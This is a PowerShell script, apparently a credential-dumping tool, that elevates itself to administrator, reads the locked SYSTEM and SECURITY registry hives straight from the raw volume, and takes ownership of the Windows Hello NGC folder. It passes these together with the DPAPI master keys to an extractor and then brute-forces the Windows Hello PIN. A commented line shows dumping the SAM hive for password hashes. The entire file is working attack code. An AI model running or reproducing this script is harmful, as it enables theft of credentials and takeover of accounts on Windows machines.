[CmdletBinding()]
param()
# $Esc = "$([char]27)"
# $Red = "${Esc}[31m"
# $Green = "${Esc}[32m"
# $Reset = "${Esc}[0m"
$currentIdentity = [Security.Principal.WindowsIdentity]::GetCurrent()
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal($currentIdentity)
$isAdmin = $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
$scriptPath = $PSCommandPath
$workingDir = Split-Path $scriptPath
Write-Verbose "Verbose"
if ($PSBoundParameters.ContainsKey('Debug')) {
    $DebugPreference = 'Continue'
}
if (-not $isAdmin) {
    Write-Host "Relaunching as Admin"
    $arguments = @(
        '-NoExit',
        '-ExecutionPolicy', 'Bypass',
        '-C', "Set-Location $workingDir; & $scriptPath"
    )
    if ($PSBoundParameters['Verbose']) {
        $arguments += '-Verbose'
    }

    if ($PSBoundParameters['Debug']) {
        $arguments += '-Debug'
    }
    Start-Process powershell.exe `
        -Verb RunAs `
        -WorkingDirectory $PSScriptRoot `
        -ArgumentList $arguments

    exit
}
# [CmdletBinding()]
# param(
#     [Parameter(Mandatory, Position = 0)]
#     [string]$Path,

#     [Parameter(Mandatory, Position = 1)]
#     [string]$OutFile
# )

$typeDef = @'
    using System;
    using System.Runtime.InteropServices;

    public static class RawDiskNative
    {
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern IntPtr CreateFile(
            string lpFileName,
            uint dwDesiredAccess,
            uint dwShareMode,
            IntPtr lpSecurityAttributes,
            uint dwCreationDisposition,
            uint dwFlagsAndAttributes,
            IntPtr hTemplateFile);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool DeviceIoControl(
            IntPtr hDevice,
            uint dwIoControlCode,
            IntPtr lpInBuffer,
            uint nInBufferSize,
            IntPtr lpOutBuffer,
            uint nOutBufferSize,
            out uint lpBytesReturned,
            IntPtr lpOverlapped);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool SetFilePointerEx(
            IntPtr hFile,
            long liDistanceToMove,
            out long lpNewFilePointer,
            uint dwMoveMethod);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadFile(
            IntPtr hFile,
            byte[] lpBuffer,
            uint nNumberOfBytesToRead,
            out uint lpNumberOfBytesRead,
            IntPtr lpOverlapped);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern bool GetDiskFreeSpace(
            string lpRootPathName,
            out uint lpSectorsPerCluster,
            out uint lpBytesPerSector,
            out uint lpNumberOfFreeClusters,
            out uint lpTotalNumberOfClusters);

        public const uint GENERIC_READ        = 0x80000000;
        public const uint FILE_SHARE_READ     = 0x1;
        public const uint FILE_SHARE_WRITE    = 0x2;
        public const uint FILE_SHARE_DELETE   = 0x4;
        public const uint OPEN_EXISTING       = 3;
        public const uint FILE_ATTRIBUTE_NORMAL = 0x80;
        public const uint FSCTL_GET_RETRIEVAL_POINTERS = 0x00090073;
        public static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
    }
'@
if (-not ("RawDiskNative" -as [type])) {
    Add-Type -TypeDefinition $typeDef -Language CSharp
}


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

function Test-IsAdmin {
    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    $p = New-Object Security.Principal.WindowsPrincipal($id)
    return $p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}
#region rawdiskaccess
function Get-ClusterSize {
    param([Parameter(Mandatory)][string]$RootPath)  # e.g. "C:\"

    $spc = 0; $bps = 0; $free = 0; $total = 0
    $ok = [RawDiskNative]::GetDiskFreeSpace($RootPath, [ref]$spc, [ref]$bps, [ref]$free, [ref]$total)
    if (-not $ok) {
        throw "GetDiskFreeSpace failed for '$RootPath' (Win32 error $([Runtime.InteropServices.Marshal]::GetLastWin32Error()))"
    }
    return [uint64]$spc * [uint64]$bps
}

<#
.SYNOPSIS
Returns the NTFS cluster run list (extents) for a file, including the
computed byte offset on disk for each run.
#>
function Get-FileDiskOffset {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory, Position = 0)]
        [string]$Path
    )

    if (-not (Test-IsAdmin)) {
        throw "This function requires an elevated (Administrator) PowerShell session."
    }

    $full = (Resolve-Path -LiteralPath $Path).ProviderPath
    $driveRoot = [System.IO.Path]::GetPathRoot($full)   # e.g. "C:\"
    $volumeDev = "\\.\$($driveRoot.TrimEnd('\'))"        # e.g. "\\.\C:"

    $clusterSize = Get-ClusterSize -RootPath $driveRoot

    # Open the file for METADATA ONLY (0 = no read/write data access).
    # This succeeds even if another process has the file open exclusively.
    $hFile = [RawDiskNative]::CreateFile(
        $full,
        0,
        [RawDiskNative]::FILE_SHARE_READ -bor [RawDiskNative]::FILE_SHARE_WRITE -bor [RawDiskNative]::FILE_SHARE_DELETE,
        [IntPtr]::Zero,
        [RawDiskNative]::OPEN_EXISTING,
        [RawDiskNative]::FILE_ATTRIBUTE_NORMAL,
        [IntPtr]::Zero
    )

    if ($hFile -eq [RawDiskNative]::INVALID_HANDLE_VALUE) {
        throw "CreateFile failed for '$full' (Win32 error $([Runtime.InteropServices.Marshal]::GetLastWin32Error()))"
    }

    try {
        # Input buffer: STARTING_VCN_INPUT_BUFFER = single LARGE_INTEGER (8 bytes), start at VCN 0
        $inBuf = [Runtime.InteropServices.Marshal]::AllocHGlobal(8)
        [Runtime.InteropServices.Marshal]::WriteInt64($inBuf, 0, 0)

        # Output buffer: RETRIEVAL_POINTERS_BUFFER, sized generously for many extents
        $outSize = 64KB
        $outBuf = [Runtime.InteropServices.Marshal]::AllocHGlobal([int]$outSize)

        try {
            [uint32]$bytesReturned = 0
            $ok = [RawDiskNative]::DeviceIoControl(
                $hFile,
                [RawDiskNative]::FSCTL_GET_RETRIEVAL_POINTERS,
                $inBuf, 8,
                $outBuf, $outSize,
                [ref]$bytesReturned,
                [IntPtr]::Zero
            )

            if (-not $ok) {
                $err = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                if ($err -eq 38) {
                    # ERROR_HANDLE_EOF -> file is resident (no clusters allocated) or empty
                    Write-Warning "No extents returned - file may be tiny/resident (stored inline in the MFT) or empty."
                    return @()
                }
                throw "DeviceIoControl(FSCTL_GET_RETRIEVAL_POINTERS) failed (Win32 error $err)"
            }

            # Parse RETRIEVAL_POINTERS_BUFFER manually (variable-length struct):
            #   offset 0  : DWORD ExtentCount
            #   offset 8  : LARGE_INTEGER StartingVcn
            #   offset 16 : { LARGE_INTEGER NextVcn; LARGE_INTEGER Lcn; } Extents[ExtentCount]
            $extentCount = [Runtime.InteropServices.Marshal]::ReadInt32($outBuf, 0)
            $startingVcn = [Runtime.InteropServices.Marshal]::ReadInt64($outBuf, 8)

            $results = New-Object System.Collections.Generic.List[psobject]
            $prevVcn = $startingVcn
            $recordOffset = 16

            for ($i = 0; $i -lt $extentCount; $i++) {
                $nextVcn = [Runtime.InteropServices.Marshal]::ReadInt64($outBuf, $recordOffset)
                $lcn = [Runtime.InteropServices.Marshal]::ReadInt64($outBuf, $recordOffset + 8)
                $recordOffset += 16

                $runClusters = $nextVcn - $prevVcn
                $isSparse = ($lcn -eq -1)

                $results.Add([pscustomobject]@{
                        ExtentIndex  = $i
                        StartVcn     = $prevVcn
                        EndVcn       = $nextVcn
                        ClusterCount = $runClusters
                        Lcn          = $lcn
                        IsSparseHole = $isSparse
                        ByteOffset   = if ($isSparse) {
                            $null 
                        }
                        else {
                            [uint64]$lcn * $clusterSize 
                        }
                        ByteLength   = $runClusters * $clusterSize
                        ClusterSize  = $clusterSize
                        Volume       = $volumeDev
                    })

                $prevVcn = $nextVcn
            }

            return $results
        }
        finally {
            [Runtime.InteropServices.Marshal]::FreeHGlobal($inBuf)
            [Runtime.InteropServices.Marshal]::FreeHGlobal($outBuf)
        }
    }
    finally {
        [RawDiskNative]::CloseHandle($hFile) | Out-Null
    }
}

<#
.SYNOPSIS
Reads a file's raw bytes directly from the volume (bypassing the
filesystem's data-access locking) and writes them to -OutFile.
#>
function Read-RawFileBytes {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory, Position = 0)]
        [string]$Path,

        [Parameter(Mandatory, Position = 1)]
        [string]$OutFile
    )

    if (-not (Test-IsAdmin)) {
        throw "This function requires an elevated (Administrator) PowerShell session."
    }

    $full = (Resolve-Path -LiteralPath $Path).ProviderPath
    $driveRoot = [System.IO.Path]::GetPathRoot($full)
    $volumeDev = "\\.\$($driveRoot.TrimEnd('\'))"

    # File's logical size - used to trim the final (padded) cluster.
    # This is read via normal metadata (works on locked files too).
    $fileInfo = Get-Item -LiteralPath $full -Force
    $logicalSize = [uint64]$fileInfo.Length

    $extents = Get-FileDiskOffset -Path $full
    if (-not $extents -or $extents.Count -eq 0) {
        throw "No extents found for '$full' - it may be resident (tiny) or empty. Nothing to read from the cluster heap."
    }

    # Open the raw volume for reading.
    $hVol = [RawDiskNative]::CreateFile(
        $volumeDev,
        [RawDiskNative]::GENERIC_READ,
        [RawDiskNative]::FILE_SHARE_READ -bor [RawDiskNative]::FILE_SHARE_WRITE,
        [IntPtr]::Zero,
        [RawDiskNative]::OPEN_EXISTING,
        0,
        [IntPtr]::Zero
    )

    if ($hVol -eq [RawDiskNative]::INVALID_HANDLE_VALUE) {
        throw "CreateFile failed for volume '$volumeDev' (Win32 error $([Runtime.InteropServices.Marshal]::GetLastWin32Error())). Are you elevated?"
    }

    try {
        $outStream = [System.IO.File]::Open($OutFile, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write)
        try {
            $totalWritten = [uint64]0

            foreach ($ext in $extents) {
                $remainingNeeded = $logicalSize - $totalWritten
                if ($remainingNeeded -le 0) {
                    break 
                }

                $toReadForThisExtent = [Math]::Min([uint64]$ext.ByteLength, $remainingNeeded)

                if ($ext.IsSparseHole) {
                    # Sparse hole -> write zero bytes, no disk read needed
                    $zeroBuf = New-Object byte[] ([int]$toReadForThisExtent)
                    $outStream.Write($zeroBuf, 0, $zeroBuf.Length)
                    $totalWritten += $toReadForThisExtent
                    continue
                }

                [long]$newPos = 0
                $seekOk = [RawDiskNative]::SetFilePointerEx($hVol, [int64]$ext.ByteOffset, [ref]$newPos, 0) # FILE_BEGIN
                if (-not $seekOk) {
                    throw "SetFilePointerEx failed at offset $($ext.ByteOffset) (Win32 error $([Runtime.InteropServices.Marshal]::GetLastWin32Error()))"
                }

                # Read in chunks to keep buffers reasonable
                $chunkSize = 4MB
                $remainingInExtent = [uint64]$toReadForThisExtent

                while ($remainingInExtent -gt 0) {
                    $thisChunk = [Math]::Min([uint64]$chunkSize, $remainingInExtent)
                    $buf = New-Object byte[] ([int]$thisChunk)
                    [uint32]$bytesRead = 0

                    $readOk = [RawDiskNative]::ReadFile($hVol, $buf, [uint32]$thisChunk, [ref]$bytesRead, [IntPtr]::Zero)
                    if (-not $readOk) {
                        throw "ReadFile on volume failed (Win32 error $([Runtime.InteropServices.Marshal]::GetLastWin32Error()))"
                    }
                    if ($bytesRead -eq 0) {
                        break 
                    }

                    $outStream.Write($buf, 0, $bytesRead)
                    $totalWritten += $bytesRead
                    $remainingInExtent -= $bytesRead
                }
            }

            Write-Verbose "Wrote $totalWritten of $logicalSize expected bytes to '$OutFile'."
            if ($totalWritten -ne $logicalSize) {
                Write-Warning "Reconstructed size ($totalWritten) does not match logical file size ($logicalSize) - file may use compression/encryption, or extents were incomplete."
            }
        }
        finally {
            $outStream.Dispose()
        }
    }
    finally {
        [RawDiskNative]::CloseHandle($hVol) | Out-Null
    }

    Get-Item -LiteralPath $OutFile
}

#endregion


# ---------------------------------------------------------------------------
# Example usage (commented out):
# ---------------------------------------------------------------------------
# Get-FileDiskOffset -Path 'C:\path\to\file.ext' | Format-Table -AutoSize
# Read-RawFileBytes  -Path 'C:\path\to\locked-file.ext' -OutFile 'C:\temp\recovered.ext' -Verbose
# Read-RawFileBytes  -Path 'C:\Windows\System32\config\SAM' -OutFile 'C:\Users\test\SAMdump' -Verbose -> to extract SAM file and possibly parse it later to extract user password hashes using https://github.com/Endermanch/scripts or https://github.com/303entity303/Windows-Password-Extractor
Write-Host "This could take a bit of time..."
$cryptoKeysPath = "C:\Windows\ServiceProfiles\LocalService\AppData\Roaming\Microsoft\Crypto\Keys\"
Write-Debug "Crypto Keys Path: $($cryptoKeysPath)`n Exists: $(Test-Path $cryptoKeysPath)"

$masterKeyPath = "C:\Windows\System32\Microsoft\Protect\S-1-5-18\User"
Write-Debug "Master Key Path: $($masterKeyPath)`n Exists: $(Test-Path $masterKeyPath)"

$ngcPath = "C:\Windows\ServiceProfiles\LocalService\AppData\Local\Microsoft\Ngc\"
Write-Debug "NGC Path: $($ngcPath)`n Exists: $(Test-Path $ngcPath)"

$baseFolderPath = (Join-Path (Get-Location) "Extracted")
Write-Debug "Base Operations Folder Path: $($baseFolderPath)`n Exists: $(Test-Path $baseFolderPath)"

$SYSTEMDumpPath = (Join-Path $baseFolderPath "SYSTEM")
Write-Debug "SYSTEM hive dump Path: $($SYSTEMDumpPath)`n Exists: $(Test-Path $SYSTEMDumpPath)"

$SECURITYDumpPath = (Join-Path $baseFolderPath "SECURITY")
Write-Debug "SECURITY hive dump Path: $($SECURITYDumpPath)`n Exists: $(Test-Path $SECURITYDumpPath)"

$ExtractedHashPath = (Join-Path $baseFolderPath "hash")
Write-Debug "Hash dump Path: $($ExtractedHashPath)`n Exists: $(Test-Path $ExtractedHashPath)"
if ( -not $PSBoundParameters.ContainsKey('Verbose') -or -not $PSBoundParameters.ContainsKey('Debug')) {
    New-Item -ItemType Directory -Path $baseFolderPath -Force | Out-Null
    
    Read-RawFileBytes -Path C:\Windows\System32\config\SYSTEM -OutFile $SYSTEMDumpPath | Out-Null
    
    Read-RawFileBytes -Path C:\Windows\System32\config\SECURITY -OutFile $SECURITYDumpPath | Out-Null
    
    TAKEOWN /f $ngcPath /r /D Y | Out-Null
    
    icacls $ngcPath /grant "$(whoami):(F)" /t | Out-Null

} else {
    New-Item -ItemType Directory -Path $baseFolderPath -Force
    Write-Verbose "Created folder $($baseFolderPath)"

    Write-Verbose "Extracting the SAM hive..."
    Read-RawFileBytes -Path C:\Windows\System32\config\SYSTEM -OutFile $SYSTEMDumpPath

    Write-Verbose "Extracting the SYSTEM hive..."
    Read-RawFileBytes -Path C:\Windows\System32\config\SECURITY -OutFile $SECURITYDumpPath
    
    Write-Verbose "Taking ownership of $($ngcPath)"
    TAKEOWN /f $ngcPath /r /D Y
    
    Write-Verbose "granting permissions to $($ngcPath)"
    icacls $ngcPath /grant "$(whoami):(F)" /t
}
Write-Verbose "Launching Hash extractor"
Write-Debug "Launching Hash Extractor with arguments --cryptokeys $cryptoKeysPath --masterkey $masterKeyPath --system $SYSTEMDumpPath --security $SECURITYDumpPath --ngc $ngcPath"
.\hash_extractor.exe --cryptokeys $cryptoKeysPath `
    --masterkey $masterKeyPath `
    --system $SYSTEMDumpPath `
    --security $SECURITYDumpPath `
    --ngc $ngcPath | Set-Content -Path $ExtractedHashPath
Write-Host "Done :)"
$shouldCrackReply = Read-Host "Do you want to try to crack the hash?(no = output hashcat-ready input string) (Y/n)"
if ([string]::IsNullOrWhiteSpace($shouldCrackReply)) {
    Write-Debug "User reply was empty, trying to crack the pin by default"
    $shouldCrack = $true
} elseif ($shouldCrackReply -eq "Y") {
    Write-Debug "User reply was yes ('$($shouldCrackReply)') cracking the pin"
    $shouldCrack = $true
} elseif ($shouldCrackReply -eq "n") {
    Write-Debug "User reply was no ('$($shouldCrackReply)'), not cracking the pin and outputting extracted hash and info"
    $shouldCrack = $false
} else {
    Write-Debug "User reply was not valid ('$($shouldCrackReply)')"
    Write-Host "Please enter Yes or No" -ForegroundColor Red
    exit
}

if (-not $shouldCrack) {
    Get-Content $ExtractedHashPath -Raw
    exit
}
$UserModeReply = Read-Host "Enter 'N' if the PIN is numeric or 'A' if it is Alphanumeric" 
Write-Verbose "User Reply was $($UserModeReply)"

if ($UserModeReply -match "^N$") {
    $mode = "numeric"
    Write-Debug "Mode matched ^N$ and is therefore set to 'numeric($($mode))"
}
elseif ($UserModeReply -match "^A$") {
    $mode = "alpha"
    Write-Debug "Mode matched ^A$ and is therefore set to 'alphanumeric'$($mode)"
}
elseif ([string]::IsNullOrWhiteSpace($UserModeReply)) {
    $mode = "numeric"
    Write-Debug "User reply was empty therefore mode set to numeric ($($mode))"
}
else {
    Write-Debug "User reply was neither valid nor empty"
    Write-Host "Choose a valid mode (Numeric or Alpha)" -ForegroundColor Red
    exit
}

$minLenReply = Read-Host "Minimum PIN length to try (default is 4)"
Write-Verbose "Minimum Length specified is $minLenReply"

if ([string]::IsNullOrWhiteSpace($minLenReply)) {
    $minLen = 4
    Write-Debug "Minimum length specified is empty, therfore set to default of $($minlen)"
}
elseif (-not [int]::TryParse($minLenReply, [ref]0)) {
    Write-Debug "Minimumlength specified is not a valid integer"
    Write-Host "Enter a valid integer." -ForegroundColor Red
    return
}
else {
    Write-Debug "Minimum Length specified is valid ($($minLenReply))"
    $minLen = $minLenReply
}

$maxLenReply = Read-Host "Maximum PIN length to try (default is 6)"
Write-Verbose "Maximum Length specified is $minLenReply"

if ([string]::IsNullOrWhiteSpace($maxLenReply)) {
    Write-Debug "Maximum length specified is empty, therfore set to default of $($maxlen)"
    $maxLen = 4
}
elseif (-not [int]::TryParse($maxLenReply, [ref]0)) {
    Write-Debug "Maximum length specified is not a valid integer"
    Write-Host "Enter a valid integer." -ForegroundColor Red
    return
}
else {
    $maxLen = $maxLenReply
    Write-Debug "Maximum Length specified is valid ($($maxLenReply))"
}
Write-Verbose "Launching hash cracker"
Write-Debug "Launching hash cracker with --hash-file $ExtractedHashPath --mode $mode --min-length $minLen --max-length $maxLen"
.\hash_cracker.exe --hash-file $ExtractedHashPath --mode $mode --min-length $minLen --max-length $maxLen